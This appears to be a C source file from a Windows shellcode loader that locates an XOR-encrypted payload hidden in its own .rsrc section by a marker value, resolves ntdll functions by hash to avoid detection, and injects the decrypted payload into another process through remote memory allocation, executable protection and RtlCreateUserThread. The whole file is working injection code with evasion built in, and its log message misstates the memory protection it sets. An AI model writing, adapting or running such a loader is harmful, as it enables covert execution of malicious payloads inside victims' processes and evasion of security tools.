#include "Loader.h"

RSRC rsrc;


PRSRC ExtractResources()
{
    PBYTE                   ImageBase;
    PIMAGE_SECTION_HEADER   rsrcSection;
    
    ImageBase   = (PBYTE)GetModuleByHash(0);
    
    rsrcSection = GetSection((HMODULE)ImageBase, ".rsrc");
    
    ImageBase   += rsrcSection->VirtualAddress;

    // Hunting...
    for (DWORD i = 0; i < rsrcSection->Misc.VirtualSize; i++, ImageBase++)
    {
        if (*(DWORD64*)ImageBase == 0xBAADF00DBAADF00D)
        {
            ImageBase += 8;
            break;
        }
    }

    // Parsing
    rsrc.key            = *(DWORD32*) ImageBase;
    rsrc.payload_len    = *(DWORD64*)(ImageBase + sizeof(DWORD32));
    rsrc.payload        = (PBYTE)(ImageBase + sizeof(DWORD32) + sizeof(DWORD64));
    
    printf("[+] Payload\n    |--[*] Address: [0x%p]\n    |--[*] Size: %d\n    |--[*] Key: %X\n", rsrc.payload, rsrc.payload_len, rsrc.key);
    
    
    return (&rsrc);
}


VOID    Inject(DWORD pid)
{
    NtWriteVirtualMemory_t      NtWriteVirtualMemory;
    NtOpenProcess_t             NtOpenProcess;
    NtAllocateVirtualMemory_t   NtAllocateVirtualMemory;
    NtProtectVirtualMemory_t    NtProtectVirtualMemory;
    RtlCreateUserThread_t       RtlCreateUserThread;
    NtClose_t                   NtClose;

    HMODULE                     hNtdll   = NULL;
    HANDLE                      hProcess = NULL;
    HANDLE                      hThread  = NULL;
    
    CLIENT_ID                   ClientId;
    OBJECT_ATTRIBUTES           ObjectAttributes;
    PVOID                       remoteMemory        = NULL;
    DWORD64                     remoteMemorySize    = 0;
    ULONG                       oldProtection       = 0;
    PBYTE                       payload             = NULL;

    payload                 = (PBYTE)malloc(rsrc.payload_len);
    hNtdll                  = GetModuleByHash(NTDLL);
    ClientId.UniqueThread   = NULL;
    ClientId.UniqueProcess  = (HANDLE)pid;
    remoteMemorySize        = (DWORD64)rsrc.payload_len;

    memcpy(payload, rsrc.payload, rsrc.payload_len);

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    
    printf("[+] Injecting to [%d]...\n", pid);
    
    if (hNtdll)
    {
        NtOpenProcess           = (NtOpenProcess_t) GetProcAddressByHash(hNtdll, NT_OPEN_PROCESS);
        NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetProcAddressByHash(hNtdll, NT_ALLOCATE_VM);
        NtWriteVirtualMemory    = (NtWriteVirtualMemory_t) GetProcAddressByHash(hNtdll, NT_WRITE_VM);
        NtProtectVirtualMemory  = (NtProtectVirtualMemory_t) GetProcAddressByHash(hNtdll, NT_PROTECT_VM);
        RtlCreateUserThread     = (RtlCreateUserThread_t) GetProcAddressByHash(hNtdll, RTL_CREATE_USER_THREAD);
        NtClose                 = (NtClose_t) GetProcAddressByHash(hNtdll, NT_CLOSE);


        if (NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId)))
        {
            printf("[+] Open a handle to the target process.\n    |--[*] Handle: 0x%p\n", hProcess);

            if (NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, (PULONG) &remoteMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
            {
                printf("[+] Allocate memory for our payload\n    |--[*] Remote Buffer: 0x%p\n    |--[*] Protection: PAGE_READWRITE\n", remoteMemory);

                XOR(payload, rsrc.payload_len, (PBYTE)&rsrc.key, 4);
                
                puts("[+] Payload decrypted");

                if (NT_SUCCESS(NtWriteVirtualMemory(hProcess, remoteMemory, payload, rsrc.payload_len, NULL)))
                {

                    printf("[+] Copy payload to 0x%p\n", remoteMemory);
                    
                    memset(payload, 0, rsrc.payload_len);

                    free(payload);

                    payload = NULL;
                    
                    if (NT_SUCCESS(NtProtectVirtualMemory(hProcess, &remoteMemory, (PULONG) & remoteMemorySize, PAGE_EXECUTE_READWRITE, &oldProtection)))
                    {
                        puts("[+] Change protection to PAGE_EXECUTE_READ.");
                
                        if (NT_SUCCESS(RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, remoteMemory, NULL, &hThread, NULL)))
                        {
                            printf("[+] Process [%d] successfully got injected \n    |--[*] Handle = 0x%p\n", pid, hThread);
                            goto CleanUP;
                        }
                        else
                        {
                            puts("[-] Couldn't create remote thread");
                            goto CleanUP;
                        }
                    }
                    else
                    {
                        puts("[-] Couldn't change remote memory protection");
                        goto CleanUP;
                    }

                }
                else
                {
                    puts("[+] failed to write payload into remote memory");
                    goto CleanUP;
                }
            }
            else
            {
                puts("[-] Couldn't allocate remote memory");
                goto CleanUP;
            }
        }
        else
        {
            puts("[-] Couldn't open a handle to the target process");
            goto CleanUP;
        }

CleanUP:
        if (payload)
            free(payload);
        if (hProcess)
            NtClose(hProcess);
        if (hThread)
            NtClose(hThread);
    }

}
